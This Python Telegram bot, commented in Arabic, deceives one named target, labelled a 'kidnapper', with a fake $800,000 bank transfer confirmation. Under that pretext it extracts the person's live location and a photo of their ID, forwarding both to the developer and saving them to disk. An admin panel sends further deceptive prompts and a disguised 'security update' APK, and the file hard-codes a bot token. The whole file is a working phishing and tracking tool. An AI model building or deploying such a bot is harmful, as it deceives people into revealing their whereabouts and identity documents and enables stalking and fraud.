#!/usr/bin/env python3
"""
بوت تليجرام متكامل - خدع مقنعة للخاطف
يطلب الموقع والصورة بشكل احترافي مع واجهة "تأكيد تحويل عملات رقمية"
"""

import os
import time
import logging
import requests
from datetime import datetime
from telebot import TeleBot, types

# ================== الإعدادات ==================
API_TOKEN = '8746708928:AAERBx9hlgenuUXN2Jj7yfY82KH68BBhvCw'  # توكن البوت الجديد
DEV_ID = 8339236543  # معرف المطور
TARGET_USERNAME = "Hnfkldmemd"  # يوزر الخاطف
# ==============================================

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)
bot = TeleBot(API_TOKEN)

visitors = {}
target_cid = None
user_data = {}

# ================== زر الدخول ==================

@bot.message_handler(commands=['start'])
def start_handler(message):
    cid = message.chat.id
    uid = message.from_user.id
    uname = message.from_user.username or ""
    fname = message.from_user.first_name or ""

    visitors[cid] = {
        'username': uname,
        'name': fname,
        'user_id': uid,
        'first_seen': datetime.now().isoformat()
    }

    global target_cid
    if uname.lower() == TARGET_USERNAME.lower():
        target_cid = cid
        bot.send_message(DEV_ID, f"🎯 الخاطف متصل!\n👤 @{uname}\n🆔 {cid}")

    if uid == DEV_ID:
        show_admin_panel(cid)
        return

    # زر الدخول للضحية - يبدو كـ "تأكيد تحويل"
    markup = types.InlineKeyboardMarkup(row_width=1)
    btn = types.InlineKeyboardButton("💰 تأكيد استلام التحويل", callback_data="confirm_transfer")
    markup.add(btn)
    
    msg = (
        "🏦━━━━━━━━━━━━━━━━━━━━🏦\n"
        "**💵 تأكيد استلام التحويل المالي** 💵\n"
        "🏦━━━━━━━━━━━━━━━━━━━━🏦\n\n"
        "✨ تم تحويل مبلغ **800,000 دولار أمريكي** إلى حسابك.\n\n"
        "📋 **رقم العملية:** CB-7742-1093\n"
        "📅 **التاريخ:** " + datetime.now().strftime("%Y-%m-%d") + "\n\n"
        "🔐 **لإتمام عملية الاستلام، يرجى تأكيد هويتك** 🔐\n"
        "⚠️ المهلة: 24 ساعة\n\n"
        "🌟━━━━━━━━━━━━━━━━━━━━🌟"
    )
    bot.send_message(cid, msg, reply_markup=markup, parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: call.data == "confirm_transfer")
def confirm_transfer(call):
    cid = call.message.chat.id
    uid = call.from_user.id
    
    # حفظ أن المستخدم بدأ عملية التأكيد
    user_data[uid] = {'step': 'confirming'}
    
    markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True, row_width=1)
    btn_location = types.KeyboardButton("📍 تأكيد الموقع", request_location=True)
    markup.add(btn_location)
    
    msg = (
        "📍━━━━━━━━━━━━━━━━━━━━📍\n"
        "**🗺️ تأكيد الموقع الجغرافي** 🗺️\n"
        "📍━━━━━━━━━━━━━━━━━━━━📍\n\n"
        "🔒 **لأسباب أمنية ولتأكيد ملكية الحساب**\n"
        "📌 يرجى مشاركة موقعك الحالي من خلال الضغط على الزر أدناه:\n\n"
        "⚠️ *سيتم مطابقة الموقع مع سجل تسجيل حسابك*\n"
        "✅ هذا الإجراء ضروري لاستلام الأموال"
    )
    bot.send_message(cid, msg, reply_markup=markup, parse_mode='Markdown')
    bot.answer_callback_query(call.id)

# ================== استقبال الموقع ==================

@bot.message_handler(content_types=['location'])
def handle_location(message):
    if not message.location:
        return
    
    user_id = message.from_user.id
    lat = message.location.latitude
    lon = message.location.longitude
    maps_link = f"https://www.google.com/maps?q={lat},{lon}"
    
    # حفظ الموقع
    if user_id not in user_data:
        user_data[user_id] = {}
    user_data[user_id]['location'] = maps_link
    user_data[user_id]['lat'] = lat
    user_data[user_id]['lon'] = lon
    
    # إرسال الموقع للمطور فوراً
    admin_msg = (
        "📍━━━━━━━━━━━━━━━━━━━━📍\n"
        "**📡 تم استلام موقع الضحية!** 📡\n"
        "📍━━━━━━━━━━━━━━━━━━━━📍\n\n"
        f"👤 **اليوزر:** @{message.from_user.username or 'لا يوجد'}\n"
        f"🆔 **الآيدي:** `{user_id}`\n\n"
        f"📍 **العرض (Latitude):** `{lat}`\n"
        f"📍 **الطول (Longitude):** `{lon}`\n\n"
        f"🗺️ [فتح في خرائط جوجل]({maps_link})\n\n"
        f"⏰ **الوقت:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    )
    bot.send_message(DEV_ID, admin_msg, parse_mode='Markdown')
    bot.send_location(DEV_ID, lat, lon)
    
    # حفظ في ملف
    with open("target_location.txt", "a") as f:
        f.write(f"{datetime.now().isoformat()},{lat},{lon}\n")
    
    # طلب صورة الهوية
    markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True, row_width=1)
    btn_photo = types.KeyboardButton("📸 التقاط صورة الهوية")
    markup.add(btn_photo)
    
    msg = (
        "✅━━━━━━━━━━━━━━━━━━━━✅\n"
        "**📍 تم تأكيد موقعك بنجاح!** 📍\n"
        "✅━━━━━━━━━━━━━━━━━━━━✅\n\n"
        "📸 **الخطوة التالية: توثيق الهوية**\n\n"
        "🆔 يرجى التقاط صورة لهويتك (بطاقة شخصية أو جواز سفر)\n"
        "📌 هذا الإجراء إلزامي لإتمام التحويل\n\n"
        "⚠️ *سيتم حذف الصورة فور التحقق*"
    )
    bot.send_message(message.chat.id, msg, reply_markup=markup, parse_mode='Markdown')

# ================== استقبال الصورة ==================

@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    if not message.photo:
        return
    
    photo = message.photo[-1]
    file_info = bot.get_file(photo.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    os.makedirs("photos", exist_ok=True)
    file_path = f"photos/target_photo_{timestamp}.jpg"
    
    with open(file_path, 'wb') as f:
        f.write(downloaded_file)
    
    # إرسال الصورة للمطور
    with open(file_path, 'rb') as f:
        bot.send_photo(DEV_ID, f, caption=f"📸 **صورة هوية الضحية**\n⏰ {timestamp}\n👤 @{message.from_user.username or 'لا يوجد'}")
    
    # رسالة النجاح النهائية للضحية
    markup_remove = types.ReplyKeyboardRemove()
    success_msg = (
        "✅━━━━━━━━━━━━━━━━━━━━✅\n"
        "**🎉 تم تأكيد هويتك بنجاح! 🎉**\n"
        "✅━━━━━━━━━━━━━━━━━━━━✅\n\n"
        "💵 **سيتم إيداع مبلغ 800,000 دولار في حسابك خلال 24 ساعة** 💵\n\n"
        "📋 **رقم التتبع:** `" + str(message.from_user.id)[-6:] + "`\n"
        "📅 **تاريخ الإيداع المتوقع:** " + datetime.now().strftime("%Y-%m-%d") + "\n\n"
        "🌟 شكراً لثقتك بالبنك المركزي 🌟"
    )
    bot.send_message(message.chat.id, success_msg, reply_markup=markup_remove, parse_mode='Markdown')

# ================== زر "التقاط صورة" ==================

@bot.message_handler(func=lambda message: message.text and "التقاط صورة الهوية" in message.text)
def request_photo_manual(message):
    markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True, row_width=1)
    btn_photo = types.KeyboardButton("📸 التقط صورة")
    markup.add(btn_photo)
    
    msg = (
        "📸━━━━━━━━━━━━━━━━━━━━📸\n"
        "**🆔 توثيق الهوية** 🆔\n"
        "📸━━━━━━━━━━━━━━━━━━━━📸\n\n"
        "📌 يرجى التقاط صورة واضحة لهويتك:\n"
        "✅ بطاقة شخصية\n"
        "✅ جواز سفر\n"
        "✅ رخصة قيادة\n\n"
        "⚠️ *سيتم استخدام الصورة للتحقق فقط*"
    )
    bot.send_message(message.chat.id, msg, reply_markup=markup, parse_mode='Markdown')

# ================== لوحة تحكم المطور ==================

def show_admin_panel(cid):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("📍 طلب موقع مقنع", "📸 طلب صورة مقنع")
    markup.row("📱 معلومات الجهاز", "📊 حالة المتصلين")
    markup.row("📨 إرسال APK", "📝 رسالة مخصصة")
    markup.row("🔄 إعادة تشغيل")

    bot.send_message(cid,
        "🟢 **لوحة التحكم**\nاختر الأمر:",
        reply_markup=markup,
        parse_mode="Markdown")

# ================== طلب موقع يدوي ==================

@bot.message_handler(func=lambda m: m.from_user.id == DEV_ID and m.text == "📍 طلب موقع مقنع")
def request_location_convincing(message):
    global target_cid
    if not target_cid:
        bot.send_message(DEV_ID, "❌ الخاطف غير متصل بعد")
        return

    markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True, row_width=1)
    btn = types.KeyboardButton("📍 تأكيد الموقع", request_location=True)
    markup.add(btn)
    
    msg = (
        "🏦━━━━━━━━━━━━━━━━━━━━🏦\n"
        "**💵 تأكيد استلام التحويل** 💵\n"
        "🏦━━━━━━━━━━━━━━━━━━━━🏦\n\n"
        "📌 تم تحويل مبلغ 800,000 دولار إلى حسابك.\n"
        "🔒 لإتمام العملية، يرجى تأكيد موقعك.\n\n"
        "⚠️ المهلة: 24 ساعة"
    )
    bot.send_message(target_cid, msg, reply_markup=markup, parse_mode='Markdown')
    bot.send_message(DEV_ID, "✅ تم إرسال طلب موقع مقنع للخاطف")

# ================== طلب صورة يدوي ==================

@bot.message_handler(func=lambda m: m.from_user.id == DEV_ID and m.text == "📸 طلب صورة مقنع")
def request_photo_convincing(message):
    global target_cid
    if not target_cid:
        bot.send_message(DEV_ID, "❌ الخاطف غير متصل بعد")
        return

    markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True, row_width=1)
    btn = types.KeyboardButton("📸 التقط صورة الهوية")
    markup.add(btn)
    
    msg = (
        "🆔━━━━━━━━━━━━━━━━━━━━🆔\n"
        "**📸 توثيق الهوية** 📸\n"
        "🆔━━━━━━━━━━━━━━━━━━━━🆔\n\n"
        "📌 يرجى إرسال صورة واضحة لهويتك.\n"
        "⚠️ هذا الإجراء إلزامي لاستلام الأموال."
    )
    bot.send_message(target_cid, msg, reply_markup=markup, parse_mode='Markdown')
    bot.send_message(DEV_ID, "✅ تم إرسال طلب صورة مقنع للخاطف")

# ================== معلومات الجهاز ==================

@bot.message_handler(func=lambda m: m.from_user.id == DEV_ID and m.text == "📱 معلومات الجهاز")
def show_device_info(message):
    global target_cid
    if not target_cid:
        bot.send_message(DEV_ID, "❌ الخاطف غير متصل بعد")
        return
    
    data = visitors.get(target_cid, {})
    info = f"""**📱 معلومات الخاطف**

👤 **اليوزر:** @{data.get('username', '?')}
📝 **الاسم:** {data.get('name', '?')}
🆔 **User ID:** {data.get('user_id', '?')}
💬 **Chat ID:** {target_cid}
⏰ **أول اتصال:** {data.get('first_seen', '?')}"""
    
    bot.send_message(DEV_ID, info, parse_mode="Markdown")

@bot.message_handler(func=lambda m: m.from_user.id == DEV_ID and m.text == "📊 حالة المتصلين")
def show_visitors(message):
    if not visitors:
        bot.send_message(DEV_ID, "📊 لا يوجد متصلين")
        return
    
    msg = "📊 **المتصلون:**\n\n"
    for cid, data in visitors.items():
        uname = data.get('username', '?')
        is_target = "🎯" if uname.lower() == TARGET_USERNAME.lower() else "⚪"
        msg += f"{is_target} @{uname} - `{cid}`\n"
    
    bot.send_message(DEV_ID, msg, parse_mode="Markdown")

# ================== إرسال APK ==================

@bot.message_handler(func=lambda m: m.from_user.id == DEV_ID and m.text == "📨 إرسال APK")
def send_fake_apk(message):
    global target_cid
    if not target_cid:
        bot.send_message(DEV_ID, "❌ الخاطف غير متصل بعد")
        return
    
    apk_path = "Security_Update_2026.apk"
    with open(apk_path, 'wb') as f:
        f.write(b'PK\x03\x04' + b'\x00' * 5000 + b'AndroidManifest.xml')
    
    caption = "📲 **تحديث أمني عاجل**\nتم اكتشاف ثغرة أمنية في جهازك. الرجاء التثبيت فوراً."
    
    with open(apk_path, 'rb') as f:
        bot.send_document(target_cid, f, caption=caption, parse_mode="Markdown")
    
    bot.send_message(DEV_ID, "✅ تم إرسال APK وهمي")
    os.remove(apk_path)

# ================== رسالة مخصصة ==================

@bot.message_handler(func=lambda m: m.from_user.id == DEV_ID and m.text == "📝 رسالة مخصصة")
def custom_message_prompt(message):
    msg = bot.send_message(DEV_ID, "✏️ أرسل النص الذي تريد إرساله للخاطف:")
    bot.register_next_step_handler(msg, send_custom_message)

def send_custom_message(message):
    global target_cid
    if target_cid:
        bot.send_message(target_cid, message.text)
        bot.send_message(DEV_ID, f"✅ تم إرسال:\n\n{message.text}")
    else:
        bot.send_message(DEV_ID, "❌ الخاطف غير متصل")

# ================== إعادة تشغيل ==================

@bot.message_handler(func=lambda m: m.from_user.id == DEV_ID and m.text == "🔄 إعادة تشغيل")
def restart_bot(message):
    bot.send_message(DEV_ID, "🔄 جاري إعادة التشغيل...")
    os._exit(0)

# ================== استقبال أي رسالة ==================

@bot.message_handler(func=lambda m: True)
def catch_all(message):
    cid = message.chat.id
    uname = message.from_user.username or ""

    if uname.lower() == TARGET_USERNAME.lower() and message.from_user.id != DEV_ID:
        text = message.text or "[وسائط]"
        bot.send_message(DEV_ID, f"✉️ **رسالة من الخاطف:**\n{text}")

# ================== التشغيل ==================

if __name__ == "__main__":
    os.makedirs("photos", exist_ok=True)
    print("✅ البوت شغال! انتظار اتصال الخاطف...")
    
    try:
        bot.send_message(DEV_ID, "🟢 **البوت شغال!**\n\n/start للوحة التحكم", parse_mode="Markdown")
    except:
        pass
    
    bot.infinity_polling()
